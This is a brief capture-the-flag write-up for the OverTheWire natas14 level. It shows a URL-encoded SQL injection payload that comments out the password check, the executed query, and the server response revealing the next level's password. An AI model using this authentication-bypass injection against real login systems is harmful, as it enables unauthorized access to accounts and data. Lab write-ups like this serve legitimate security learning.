## GET request
This GET request exploits an SQL injection vulnerability.
```
http://natas14.natas.labs.overthewire.org/?debug=true&username=user%22%20OR%20username%20LIKE%20%22%%22%20%23%20&password=123
```
## Effective GET parameters
```
FIELD     DECODED                           ENCODED

debug     true                              true
username  user" OR username LIKE "%" #      user%22%20OR%20username%20LIKE%20%22%%22%20%23%20
password  123                               123
          ~~~ password field doesn't matter
```

## Executed SQL
```SQL
SELECT * FROM users WHERE username="user" OR username LIKE "%" # " and password="123"
                                                               ~~~~~~~~~~~~~~~~~~~~~~ SQL comment
```

## Echoed response
```
Executing query: SELECT * from users where username="user" OR username LIKE "%" # " and password="123"
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
View sourcecode
```
